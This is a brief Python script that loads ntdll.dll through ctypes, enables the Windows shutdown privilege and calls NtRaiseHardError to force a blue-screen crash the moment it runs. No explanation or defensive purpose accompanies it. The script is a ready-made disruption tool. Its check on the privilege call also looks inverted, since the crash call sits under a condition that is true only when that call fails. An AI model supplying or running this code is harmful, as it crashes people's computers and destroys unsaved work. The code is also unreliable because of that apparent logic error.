from ctypes.wintypes import BOOL, ULONG
import ctypes

OPTION_SHUTDOWN = 6
SHUTDOWN_PRIVILEGE = 19
STATUS_NOT_IMPLEMENTED = 0xC0000002

class Bluescreen:
    def __init__(self):
        self.ntdll = ctypes.WinDLL('ntdll.dll')

        self._NtRaiseHardError = self.ntdll.NtRaiseHardError
        self._RtlAdjustPrivilege = self.ntdll.RtlAdjustPrivilege

        self.ENABLED = BOOL()
        self.RESPONSE = ULONG()

    def bsod(self):
        if self._RtlAdjustPrivilege(
            SHUTDOWN_PRIVILEGE,
            True,
            True,
            ctypes.byref(
                self.ENABLED
            )
        ):
            self._NtRaiseHardError(
                STATUS_NOT_IMPLEMENTED,
                0,
                0,
                0,
                ctypes.byref(
                    self.RESPONSE
                )
            )

if __name__ == '__main__':
    bluescreen = Bluescreen()
    bluescreen.bsod()